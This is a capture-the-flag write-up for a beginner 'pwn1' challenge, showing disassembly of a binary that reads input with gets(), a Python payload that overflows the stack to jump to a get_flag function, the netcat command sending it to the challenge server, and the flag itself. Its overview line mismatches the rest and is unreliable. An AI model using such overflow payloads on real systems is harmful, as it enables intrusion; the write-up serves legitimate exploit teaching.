## pwn1 - 40 (Pwning) ##
#### Writeup by r3ndom_ #####
Created: 2015-12-8

### Problem ###
First pwnable, this should be nice and easy.
`nc pwn.problem.sctf.io 1337.`

### Hint ###
Read up on Buffer Overflows.

## Answer ##

### Overview ###
Reverse the encryption on the flag.enc

### Details ###
```asm
                public get_flag
get_flag        proc near
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                mov     dword ptr [esp], offset command ; "cat flag.txt"

loc_80484BA:                            ; DATA XREF: BFFFF6F9r
                call    _system
                leave
                retn
get_flag        endp

                public bo
bo              proc near               ; CODE XREF: main+15p

s               = byte ptr -28h

                push    ebp
loc_80484C2:
                mov     ebp, esp
                sub     esp, 38h
                lea     eax, [ebp+s]
                mov     [esp], eax      ; s
                call    _gets
                lea     eax, [ebp-28h]
                mov     [esp+4], eax
                mov     dword ptr [esp], offset format ; "You said: %s\n"
                call    _printf
                leave
                retn
bo endp
```

Super simple stack overflow. The stack will return at an address at ebp + 0x2c so you just overflow that much.

Then you give it the address of the get_flag func.

```python
rop = 'A'*0x2c
rop += '\xad\x84\x04\x08'
print rop
```

After that just pipe it into the process and bam.

    python rop.py | nc pwn.problem.sctf.io 1337

### Flag ###

    flag{that_was_so_easy_i_wont_leetify_this_flag}
    
